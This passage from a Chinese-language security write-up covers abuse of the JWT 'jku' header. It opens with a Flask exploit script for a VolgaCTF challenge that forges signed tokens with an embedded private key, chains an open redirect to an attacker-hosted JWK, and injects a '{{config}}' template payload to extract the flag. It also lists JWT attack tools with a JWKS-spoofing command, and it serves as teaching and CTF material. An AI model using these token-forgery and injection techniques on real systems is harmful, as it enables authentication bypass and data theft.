    from jwcrypto import jwk, jws
    from jwcrypto.common import json_encode
    import os
    import json
    import requests, re
    app = Flask(__name__)
    app.config['pub_key'] = '{"e":"AQAB","kty":"RSA","n":"oBbyWuGxj4wqlVjqcpNh3ZKYTjVXWINNdn8zaJgJdPa0Wt286cE4wExWAV03Kuma7bh8yK5SgY2bte8mdjpcte5T1iOtqWTXDP5XbXQvzLPas1VVvzcMwdsMs4-mkuV6HCYaj7Sbent7Bvx_4aY8qxrIBSuqf4NBP38iE_Bkuzo_OeGtsz0f5KECUPDV-Tum1KDuiwCDt6Jmef_xAWUmAqJv9nK0GLnNceIDXmw775Gi26KxDl7g2ak22pNCEFBKbZqQak4cTeZJfNR-oUZqPXFGO9i2yZJ_G7iN-1JxSPTyqyKnG5Z16d7l1Q_TFP1btPMFu9qS_bdbnkcMxURoBQ"'
    app.config['all_key'] = '{"d":"AaOagaGz7rNRsEvDwr6NjvY0RwC2zzow7dipjxWXazIncJK6n24SBa4CZ2sr6G2R34M3C9r1D0yC3p7_NtCsKFSzWQrueUCGDyT_gihhYOgqghGKmjWXFNkITUJYQ0LEOEuPlA8WVG-1N8IYERhhoKLaj2r-COYwIdVMZQXeEiinXLfCVJCEtMMVNBMRfyUoY4_siQ6vMQGxJsHn8XOE2zsMnkreG7kPE-c0UrmsdnhmmyNFtegbS8dej4eH0Xy1txg81wTQSyGUru10QaFYVVAOhRFmdVNvSNWW3uL1guAOgLg8Y17FPnz1FiUGhflTeEsWwcKlVWl7QF0Bel-e1Q","dp":"nAk_O5Qi5HQRhgcsNZsGgFeEeErPn5CoXFx1DhANVbQwuNU-19P29wR4gSaDfexoLLaDXrw50g-ufmCLbz9r461LcPdmD6g9okstgPF38heLhjyTuA84xDu16sCX0ltpxWOWzhRkBeI0uhE1mjXtD7Uk9KUX5Y5SQK6MPZmVsoM","dq":"MznXQhv8h65iqwxzfPj3QwK6s9JvIR4IHnur2t3GYaCd-RG5fGSigkClUeG8TUlxViOr5ElbGsATWOzqAlr_CwTPCwEg9lcL5AKEHOy94k5CfAWMr1csa6Pp6bQJkveDf_c87s2Z1zYn6cJmJZiEJADocRyyUJ_mnh6wpvS7tgs","e":"AQAB","kty":"RSA","n":"oBbyWuGxj4wqlVjqcpNh3ZKYTjVXWINNdn8zaJgJdPa0Wt286cE4wExWAV03Kuma7bh8yK5SgY2bte8mdjpcte5T1iOtqWTXDP5XbXQvzLPas1VVvzcMwdsMs4-mkuV6HCYaj7Sbent7Bvx_4aY8qxrIBSuqf4NBP38iE_Bkuzo_OeGtsz0f5KECUPDV-Tum1KDuiwCDt6Jmef_xAWUmAqJv9nK0GLnNceIDXmw775Gi26KxDl7g2ak22pNCEFBKbZqQak4cTeZJfNR-oUZqPXFGO9i2yZJ_G7iN-1JxSPTyqyKnG5Z16d7l1Q_TFP1btPMFu9qS_bdbnkcMxURoBQ","p":"0-jzleXm-XbQe_gjrKqFsQUypSjtVX2NJ1ckF5op0qE1XiLETHg0C-woMuEymyW-vqRAbgA5yx4pVhlmJTPkv8TVsc9OYsz1H1cswiI-I73uLJ1wgUk_4mapa7K10Mrsw2X9AZpmiP7ntc4OwVdJ7BjUoY587IbZrV0yVCKgeYM","q":"wWXeDP796mxedqUActwBTCQCR3uNjbmOINMZY2CR0DuxCa9AX8V3VZEQVUj1Q6R8o4ixrQywQy1R902Kc9dCQqBkwF4WfybzhkfwiVcf8Yy3bqZzEoGCEbs2KVnYX7J3EBIfgEQVXb_G5ZeOvWzgSTi11e1_kdcUXdANiGtISdc","qi":"MNo8DyDds5N6gw6gmA17Iu0scH5i2n30oS0nDxFp0tKqfd5WAjF7J3P_uESwzW8AvncAm7HtDBd-KEHipcOcm7rPEdfBKKhyo3Q25chBCvRPvVcslmML30p3p0_F26yd5ThHWoo3UmHNoPLiMNZN3oRsCe1w2jity3YVvZDhu48"}'
    def generate_key():
       key = jwk.JWK.generate(kty='RSA', size=2048)
       print(key.export_public())
       print(key.export())
    @app.route('/') #to get evil jws token
    def index():
       jku = 'http://localhost:5001/vuln/redirect?endpoint=http://localhost:5002/hack' #localhost:5002 its own server, 5001 server with vuln open redirect
       payload = '{{config}}'
       key = jws.JWK(**json.loads(app.config['all_key']))
       jwstoken = jws.JWS(payload.encode('utf-8'))
       jwstoken.add_signature(key=key,alg='RS256',protected=None,header=json_encode({"kid": key.thumbprint(), 'jku':jku, "alg":"RS256"}))
       sig = jwstoken.serialize()
       return sig
    @app.route('/hack') #to redirect, return evil JWK
    def hack(): #need send as file
       with open('tmp.file', 'w') as file_write:
           file_write.write(jwk.JWK(**json.loads(app.config['all_key'])).export_public())
       uploads = os.path.join(os.path.abspath(os.path.dirname(__file__)))
       return send_from_directory(directory='.',filename='tmp.file')
    @app.route('/get_flag')
    def get_flag():
       payload = index()
       answ = requests.get('http://localhost:5000/jws_check',params={'payloads':payload}).text
       flag = answ
       flag = re.findall('VolgaCTF{.+?}', answ)[-1]
       print(flag)
       return flag
    if __name__ == '__main__':
       app.run(port=5002, host='0.0.0.0')
## 0x05 相关工具
###  [jwt_tool](https://github.com/ticarpi/jwt_tool)
**其目前的功能包括：**
>   * 检查令牌的有效性
>   * 测试已知漏洞：
>     * （CVE-2015-2951） ** _alg=none_** 签名绕过漏洞
>     * （CVE-2016-10555） ** _RS / HS256_** 公钥不匹配漏洞
>     * （CVE-2018-0114） ** _Key injection_** 漏洞
>     * （CVE-2019-20933 / CVE-2020-28637） ** _Blank password_** 漏洞
>     * （CVE-2020-28042） **_Null signature_** 漏洞
>   * 扫描配置错误或已知漏洞
>   * Fuzz声明值以引发意外行为
>   * 测试secret/key file/public key/ JWKS key的有效性
>   * 通过高速 _字典攻击_ 识别 _低强度key_
>   * 伪造新的令牌头和有效载荷内容，并使用 **密钥** 或通过其他攻击方法创建新的签名
>   * 时间戳篡改
>   * RSA和ECDSA密钥生成和重建（来自JWKS文件）
>
jwt_tools非常强大，文档：[Using
jwt_tool](https://github.com/ticarpi/jwt_tool/wiki/Using-jwt_tool)
其中关于jku攻击的部分如下：
> 欺骗远程JWKS：使用首次运行时自动生成的RSA密钥，并通过提供的URL（-ju）提供JWKS-或将该URL添加到您的jwtconf.ini配置文件中-> 并使用私钥对令牌进行签名：
    $ python3 jwt_tool.py JWT_HERE -X s -ju http://example.com/my_jwks.json
###  [MyJWT](https://github.com/mBouamama/MyJWT)
同样强大的jwt工具，文档：[MyJWT: crack Your jwt](https://myjwt.readthedocs.io/en/latest/)
> **Features**
>
>   * copy new jwt to clipboard
>   * user Interface (thanks
> [questionary](https://github.com/tmbo/questionary))
>   * color output
>   * modify jwt (header/Payload)
>   * None Vulnerability
>   * RSA/HMAC confusion
>   * Sign a jwt with key
>   * Brute Force to guess key
>   * crack jwt with regex to guess key
>   * kid injection
>   * _Jku Bypass_
>   * _X5u Bypass_
>
2020年11月添加了对jku与x5u利用的功能。
      --jku TEXT                   Jku Header to bypass authentication
      --x5u TEXT                   X5u Header to bypass authentication
###
[jwt_attack_with_header_injection.py](https://gist.github.com/imparabl3/efcf4a991244b9f8f99ac39a7c8cfe6f)
用于利用CRLF漏洞的脚本
## 0x06 总结
总结一下jku权限绕过的利用方式：
1.jku可以直接指向为攻击者服务器
  * 1.直接在服务器上放置JWK，jku指向攻击者服务器
2.jku有白名单或者别的过滤措施
  * 1.配合文件上传漏洞，上传构造好的JWK，jku指向该JWK
  * 2.配合开放重定向，直接重定向到攻击者的服务器，服务器上放置构造好的JWK
  * 3.配合CRLF漏洞，直接控制JWK内容
## 参考资料
  * [JWT: jku x5u](https://www.slideshare.net/snyff/jwt-jku-x5u?from_action=save)
  * [JWS writeups](https://telegra.ph/JWS-writeups-03-28)
  * [JWT Expert: jku Claim Misuse](https://www.youtube.com/watch?v=ThzZFIhuFMA)
  * [Hacking JWT Tokens: jku Claim Misuse](https://blog.pentesteracademy.com/hacking-jwt-tokens-jku-claim-misuse-2e732109ac1c)
  * [深入了解Json Web Token之概念篇](https://www.freebuf.com/articles/web/180874.html)
  * [攻击JWT的一些方法](https://xz.aliyun.com/t/6776#toc-12)
  * [如何使用MyJWT对JSON Web Token（JWT）进行破解和漏洞测试](https://www.freebuf.com/sectool/262183.html)
  * [Python 生成 JWT(json web token) 及 解析方式](http://t.zoukankan.com/lowmanisbusy-p-10930856.html)
  * [Attacking JSON Web Tokens (JWTs)](https://infosecwriteups.com/attacking-json-web-tokens-jwts-d1d51a1e17cb)